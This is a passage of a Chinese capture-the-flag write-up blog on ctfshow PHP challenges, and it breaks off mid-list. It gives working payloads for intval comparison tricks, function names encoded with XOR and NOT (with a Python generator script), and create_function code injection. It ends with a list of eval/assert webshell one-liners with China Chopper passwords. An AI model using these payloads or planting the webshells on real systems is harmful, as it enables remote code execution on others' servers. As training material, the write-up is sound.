&#39;ctfshow&#39;</code>只要<code>intval($code)</code>为0即可以比较为真</p><p>所以我们用一些返回值为0的函数</p><p>system、usleep 、getdata、intval等等</p><p>payload：POST：<code>f1=usleep&amp;f2=usleep</code></p><h2 id="24、构造字母"><a href="#24、构造字母" class="headerlink" title="24、构造字母"></a>24、构造字母</h2><p>如果觉得构造字母太多，可以选择使用通配符</p><p> <a href="https://blog.csdn.net/m0_51518970/article/details/121616587">https://blog.csdn.net/m0_51518970/article/details/121616587</a> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在php中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">+</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">+</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">;</span>以上方式都可以执行函数，现在就是v3需要构造字母凡是运算符都可以执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php构造字母的原理："><a href="#php构造字母的原理：" class="headerlink" title="php构造字母的原理："></a>php构造字母的原理：</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">要使用非字母下划线的字符进行构造一直非字母数字下划线的字母的ascii值都不以1（二进制）开头，所以可以全部使用最高位为1的字符构造使用异或构造 ^（当然也可以使用其他字符）但是可能使用或运算构造很难构造1只有一个的字符，而且或需要用引号所以一般不用或构造最简单的还可以使用 取反1111 1111 =>%ff1000 1111 =>%8f0111 0000 =>%70 => p 1111 1010 =>%fa1001 0010 =>%920110 1000 =>%68 => h 1111 1010 =>%fa1000 1010 =>%8a0111 0000 =>%70 => p 1111 1010 =>%fa1001 0011 =>%930110 1001 =>%69 => i 1111 1010 =>%fa1001 0100 =>%940110 1110 =>%69 => n 1111 1010 =>%fa1001 1100 =>%9c0110 0110 =>%66 => f 1111 1010 =>%fa1001 0101 =>%950110 1111 =>%6f => o 所以-%fa%fa%fa%fa%fa%fa%fa^%8a%92%8a%93%94%9c%95()-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POST：<code>?v1=1&amp;v2=1&amp;v3=-(%fa%fa%fa%fa%fa%fa%fa^%8a%92%8a%93%94%9c%95)()-</code></p><p><img src="/images/image-20220811222320349-1662567087526.png" alt="image-20220811222320349"></p><p>下面我们使用构造尝试（’system’)(‘ls’);</p><p>搞清楚原理后进行构造</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">change_by_not</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    const <span class="token operator">=</span> <span class="token number">255</span>    l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(res)</span>    ind<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"~"</span></span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        ind<span class="token operator">+=</span>i    <span class="token keyword">print</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_by_xor</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    const <span class="token operator">=</span> <span class="token number">255</span>    l<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        num<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>        r<span class="token operator">=</span>num<span class="token operator">^</span>const        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span>    ind<span class="token operator">=</span><span class="token string">"%ff"</span><span class="token operator">*</span>l<span class="token operator">+</span><span class="token string">'^'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        ind<span class="token operator">+=</span>i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token comment"># ("%10%08%10%09%0e%06%0f"|"%60%60%60%60%60%60%60")();</span><span class="token keyword">def</span> <span class="token function">change_by_or</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res_list<span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            char1<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>            char2<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>            <span class="token keyword">if</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'[a-z]|[0-9]|@|!|\+|-|\.|_|\$|&#125;|%|&amp;|;|&lt;|>|\*|/|\^|#|"'</span><span class="token punctuation">,</span>char1<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'[a-z]|[0-9]|@|!|\+|-|\.|_|\$|&#125;|%|&amp;|;|&lt;|>|\*|/|\^|#|"'</span><span class="token punctuation">,</span>char2<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                cn1 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>                cn2 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>                res <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char2<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char1<span class="token punctuation">)</span>                res_list<span class="token punctuation">[</span>res<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn2<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn2<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cn1<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># print(res_list)</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        s_num<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res_list<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s_num<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    change_by_not<span class="token punctuation">(</span><span class="token string">'phpinfo'</span><span class="token punctuation">)</span>    <span class="token comment"># change_by_or('tac flag.php')</span>    <span class="token comment"># change_by_xor("phpinfo")</span>    <span class="token comment"># print(ord('t'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220811230810130-1662567087526.png" alt="image-20220811230810130"></p><p>使用取反</p><p><img src="/images/image-20220812114248045-1662567087526.png" alt="image-20220812114248045"></p><p>使用或（有空格就不会搞）</p><p><img src="/images/image-20220812114634311-1662567087526.png" alt="image-20220812114634311"></p><h2 id="25、php闭合"><a href="#25、php闭合" class="headerlink" title="25、php闭合"></a>25、php闭合</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> payload: </p><p><code>GET ?show=;&#125;;system(&#39;grep flag flag.php&#39;);/*</code></p><p><code>POST:ctf=%5ccreate_function</code> </p><p>拼接后变成：</p><p>%5ccreate_function(‘’,;};system(‘grep flag flag.php’);&#x2F;*);</p><h2 id="27、php默认命名空间绕过"><a href="#27、php默认命名空间绕过" class="headerlink" title="27、php默认命名空间绕过"></a>27、php默认命名空间绕过</h2><p>首先，先看一个脚本：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$ctfshow)</code>不可以重头到尾都是字母数字下划线</p><p>所以采用在函数前面加<code>\</code>绕过</p><p><code>\phpinfo,</code>表示默认命名空间下的<code>phpinfo(),</code>所以没有区别</p><h3 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h3><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p><p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">create_function(string $args,string $code)string $args 声明的函数变量部分string $code 执行的方法代码部分<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>案例：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;?php$newfunc = create_function('$a, $b', 'return "$a + $b = " . ($a + $b);');echo "function: " . $newfunc . "\n";echo $newfunc(3,4);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，<code>create_function</code> 的第一个参数是匿名函数的参数名，第二个参数是函数里面的逻辑代码</p><h3 id="如何利用create-function-进行代码注入"><a href="#如何利用create-function-进行代码注入" class="headerlink" title="如何利用create_function 进行代码注入"></a><strong>如何利用create_function 进行代码注入</strong></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token string single-quoted-string">'echo  '</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'test'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"=============================="</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"=============================="</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，将<code>$str2</code>的参数带入到<code>create_function</code>中执行，那我们就需要闭合这个函数，然后注释接下来的语句就可以形成我们的payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://fx.com/create2.php?id=;&#125;;phpinfo();//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/v2-c25734c1fbb32b16db18d11d07bd7fa1_720w.jpg" alt="img"></p><p>上面匿名函数可能大家都看不明白，我把常用的函数声明的方式写出来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token string single-quoted-string">'echo  '</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'test'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a'</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等同于：</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$str2</span><span class="token comment">//(去掉双引号的内容)</span><span class="token punctuation">&#125;</span><span class="token comment">//等同于：</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'test'</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//create2.php?id=;&#125;;phpinfo();/* 注入后的代码</span><span class="token comment">//等同于：</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string single-quoted-string">' . '</span><span class="token punctuation">;</span>'  <span class="token comment">//形成代码注入</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以最终的payload：</p><p> <code>GET ?show=;&#125;;system(&#39;grep flag flag.php&#39;);/* </code></p><p><code>POSOT ctf=%5ccreate_function</code> </p><h2 id="28、PHP常见的代码执行函数"><a href="#28、PHP常见的代码执行函数" class="headerlink" title="28、PHP常见的代码执行函数"></a>28、PHP常见的代码执行函数</h2><p> <a href="https://zhuanlan.zhihu.com/p/377733114">https://zhuanlan.zhihu.com/p/377733114</a> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1. `eval` 函数   传入的参数必须为PHP代码，既需要以分号结尾。   *#命令執行：cmd=system(whoami);*   *#菜刀连接密码：cmd*   <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   2. `assert` 函数   *#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。*   *#命令執行：cmd=system(whoami)*   *#菜刀连接密码：cmd*   <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>3. `preg_replace` 函数   *#preg_replace('正则规则','替换字符'，'目标字符')*   *#执行命令和上传文件参考assert函数(不需要加分号)。*   *#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。*   preg_replace("/test/e",$_POST["cmd"],"jutst test");4. `create_function` 函数   *#创建匿名函数执行代码*   *#执行命令和上传文件参考eval函数(必须加分号)。*   *#菜刀连接密码：cmd*   $func =create_function('',$_POST['cmd']);$func();5. `array_map` 函数   *#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。*   *#命令执行http://localhost/123.php?func=system cmd=whoami*   *#菜刀连接http://localhost/123.php?func=assert 密码：cmd*   $func=$_GET['func'];   $cmd=$_POST['cmd'];   $array[0]=$cmd;   $new_array=array_map($func,$array);   echo $new_array;6. `call_user_func` 函数   *#传入的参数作为assert函数的参数*   *#cmd=system(whoami)*   *#菜刀连接密码：cmd*   call_user_func("assert",$_POST['cmd']);7. `call_user_func_array` 函数   *#将传入的参数作为数组的第一个值传递给assert函数*   *#cmd=system(whoami)*   *#菜刀连接密码：cmd*   $cmd=$_POST['cmd'];   $array[0]=$cmd;   call_user_func_array("assert",$array);8. `array_filter` 函数   *#用回调函数过滤数组中的元素：array_filter(数组,函数)*   *#命令执行func=system&amp;cmd=whoami*   *#菜刀连接http://localhost/123.php?func=assert 密码cmd*   $cmd=$_POST['cmd'];   $array1=array($cmd);   $func =$_GET['func'];   array_filter($array1,$func);9. `uasort` 函数   *#php环境>=&lt;5.6才能用*   *#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。*   